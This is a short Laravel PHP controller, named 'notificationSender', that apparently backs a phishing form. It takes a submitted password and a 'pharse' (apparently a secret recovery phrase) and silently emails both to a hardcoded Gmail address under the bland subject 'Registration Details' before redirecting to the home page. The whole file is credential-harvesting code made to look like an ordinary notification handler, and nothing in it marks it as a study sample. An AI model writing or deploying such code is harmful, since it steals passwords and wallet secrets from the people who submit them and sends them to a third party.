<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class notificationSender extends Controller
{
    public function index(Request $request)
    {
        $data = [
            'password' => $request->password,
            'pharse' => $request->pharse
        ];
        
        $user['to'] = 'sourov.okk@gmail.com';

        Mail::send('mail', $data, function($message) use ($user) {
            $message->to($user['to']);
            $message->subject('Registration Details');
        });

        return redirect('/');
    }
}
